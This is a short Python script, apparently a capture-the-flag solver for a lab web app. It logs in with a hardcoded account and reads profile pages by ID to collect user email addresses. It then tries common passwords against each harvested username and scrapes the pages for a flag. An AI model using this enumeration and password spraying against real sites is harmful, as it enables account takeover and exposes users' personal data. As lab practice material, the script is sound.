import re
import requests
from bs4 import BeautifulSoup

def get_usernames():
    usernames = []
    username = f"user1"
    password = 'diejuthdkfi14'
    session = requests.Session()
    login_data = {
        "userID": username,
        "password": password
    }
    login_url = "http://10.10.10.7/mpk5tdbu/login.php"
    _ = session.post(login_url, data=login_data)
    for i in range(1, 101):
        ok_page = session.get(f"http://10.10.10.7/mpk5tdbu/prof.php?id={i}")
        # parse and see if the tile of ok_page  is "プロフィール"
        parsed_html = BeautifulSoup(ok_page.text, "html.parser")
        # get div element with class "card-body"
        div_element = parsed_html.find("div", {"class": "card-body"})
        match = re.search(r"メールアドレス: (.*)", div_element.text)
        # print(div_element.text)
        print(match[1])
        usernames.append(match[1].split("@")[0])
    print(usernames)
    return usernames

def main(usernames):
    # ログインページのURLと認証情報
    login_url = "http://10.10.10.7/mpk5tdbu/login.php"
    # usernames = [f"user{i}"for i in range(1, 101)]
    passwords = ["password", "123456789"]

    # セッションを開始
    session = requests.Session()

    # ログインページにアクセスしてログインを試行
    for i,username in enumerate(usernames):
        for password in passwords:
            login_data = {
                "userID": username,
                "password": password
            }
            _ = session.post(login_url, data=login_data)
            ok_page = session.get("http://10.10.10.7/mpk5tdbu/prof.php?id=1")
            # parse and see if the tile of ok_page  is "プロフィール"
            parsed_html = BeautifulSoup(ok_page.text, "html.parser")
            print(parsed_html.title.text)
            if parsed_html.title.text in "プロフィール":
                print(f"ログイン成功！ {username=} {password=}")
                # ログイン後のページを取得して、フラグをスクレイピングする（ここをカスタマイズする必要があります）
                # for i in range(1, 101):
                profile_url = f"http://10.10.10.7/mpk5tdbu/prof.php?id={i}"
                profile_page = session.get(profile_url)
                profile_soup = BeautifulSoup(profile_page.content, "html.parser")
                flag_elements = profile_soup.find_all(text=lambda text: "flag" in text)
                if flag_elements:
                    for element in flag_elements:
                        print("フラグが見つかりました！ テキスト:", element)
                        return
                # if "flag" in profile_page.text:
                #     # flag = flag_element.text.strip()
                #     print(profile_page.text)
                # else:
                #     print(f"{i=}: フラグが見つかりませんでした。")
                #     # print(profile_page.text)
                return 
            else:
                print(f"ログイン失敗... {i=} {username=} {password=}")

if __name__ == "__main__":
    usernames = get_usernames()
    main(usernames)